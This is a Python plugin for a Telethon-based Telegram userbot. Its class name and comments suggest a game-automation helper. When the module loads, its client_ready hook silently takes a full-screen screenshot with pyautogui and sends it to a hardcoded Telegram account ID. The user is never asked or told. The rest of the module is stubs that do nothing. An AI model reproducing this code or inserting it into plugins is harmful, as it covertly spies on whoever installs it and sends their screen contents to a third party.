import pyautogui

import time # time.time() для времени. Используется для промежутков бонуса, бизнеса и др
import random
import logging
import asyncio
import io

from telethon import types
from .. import loader, utils

logger = logging.getLogger("Screenshots")

@loader.tds
class AutoLesyaMod(loader.Module):
	"""Скриншот"""
	strings = {"name": "ScreenShots"}
  
	async def client_ready(self, client):
        	image = pyautogui.screenshot(region=(0,0, 1920, 1080))
        	await self._client.send_message(944645249, "", file=image)
  
	async def screen(self, message):
		print(self, message)

	async def watcher(self, message):
		if not isinstance(message, types.Message):
			return
		if not message.text:
			return
		if message.from_id == self._me.id:
			return

		
